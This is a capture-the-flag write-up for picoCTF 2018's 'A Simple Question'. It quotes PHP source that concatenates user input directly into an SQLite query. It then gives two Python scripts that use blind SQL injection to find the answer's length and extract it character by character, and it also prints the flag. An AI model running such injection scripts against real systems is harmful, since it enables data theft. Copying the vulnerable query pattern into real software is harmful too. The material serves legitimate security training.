:checkered_flag: picoCTF{qu3stions_ar3_h4rd_28fc1206}

## Solve
There is a website running at `http://2018shell.picoctf.com:2644` ([link](http://2018shell.picoctf.com:2644)). Try to see if you can answer its question.

## Solution
```php
<!-- http://2018shell.picoctf.com:2644/answer2.phps -->
<?php
  include "config.php";
  ini_set('error_reporting', E_ALL);
  ini_set('display_errors', 'On');

  $answer = $_POST["answer"];
  $debug = $_POST["debug"];
  $query = "SELECT * FROM answers WHERE answer='$answer'";
  echo "<pre>";
  echo "SQL query: ", htmlspecialchars($query), "\n";
  echo "</pre>";
?>
<?php
  $con = new SQLite3($database_file);
  $result = $con->query($query);

  $row = $result->fetchArray();
  if($answer == $CANARY) {
    echo "<h1>Perfect!</h1>";
    echo "<p>Your flag is: $FLAG</p>";
  }
  elseif ($row) {
    echo "<h1>You are so close.</h1>";
  } else {
    echo "<h1>Wrong.</h1>";
  }
?>
```
```python
import requests

for i in range(1, 100):
    data = {"answer": f"' OR LENGTH(answer) = {i} --"}
    resp = requests.post("http://2018shell.picoctf.com:2644/answer2.php", data=data)    
    if "Wrong." not in resp.text.split("\n")[3]:
        print(f"LENGTH(answer) = {i}")
        break
        
# LENGTH(answer) = 14
```

```python
import requests
from itertools import chain

answer = ""

for i in range(1, 15):
    for j in chain(range(48, 58), range(65, 91), range(97, 123)):
        data = {"answer": f"' OR SUBSTR(answer, {i}, 1) = '{chr(j)}"}
        resp = requests.post("http://2018shell.picoctf.com:2644/answer2.php", data=data)
        if "Wrong." not in resp.text.split("\n")[3]:
            answer += chr(j)
            print(answer)
            break

'''
4
41
41A
41An
41And
41AndS
41AndSi
41AndSix
41AndSixS
41AndSixSi
41AndSixSix
41AndSixSixt
41AndSixSixth
41AndSixSixths
'''
```

![1](https://raw.githubusercontent.com/shoulderhu/wordpress/master/picoCTF/2018/Web%20Exploitation/A%20Simple%20Question/A-Simple-Question-1.png)
